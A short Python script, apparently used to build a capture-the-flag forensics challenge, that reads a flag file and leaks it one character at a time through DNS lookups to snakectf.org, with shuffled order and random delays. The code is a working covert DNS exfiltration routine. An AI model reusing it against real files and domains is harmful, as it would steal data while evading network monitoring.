from random import randint, shuffle
from time import sleep

from dns.resolver import NoAnswer, resolve

domain = "snakectf.org"
with open("../flags.txt") as f:
    flag = f.read().strip()

flag_parts = [(i, c) for i, c in enumerate(flag)]
shuffle(flag_parts)

print(flag_parts)

for i, c in flag_parts:
    query = f"{i}-{c}.{domain}"
    print(query)
    try:
        resolve(query, "A")
    except NoAnswer:
        pass
    sleep(randint(1, 5))
